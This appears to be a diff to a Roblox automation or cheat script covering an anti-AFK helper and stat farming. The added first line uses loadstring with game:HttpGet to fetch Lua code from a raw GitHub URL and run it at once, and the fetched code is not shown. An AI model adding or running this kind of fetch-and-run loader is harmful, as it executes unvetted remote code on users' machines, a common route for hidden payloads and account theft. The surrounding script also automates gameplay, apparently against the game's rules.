@@ -1,4 +1,5 @@
-		 local yo = game:GetService('Players').LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fernando6663535/Lua/main/To_Bills.Lua"))()
+local yo = game:GetService('Players').LocalPlayer
 local folderData = game.ReplicatedStorage.Datas[yo.UserId]
 local afk = game:service'VirtualUser'
 local statsRequeridosFarm = 4000
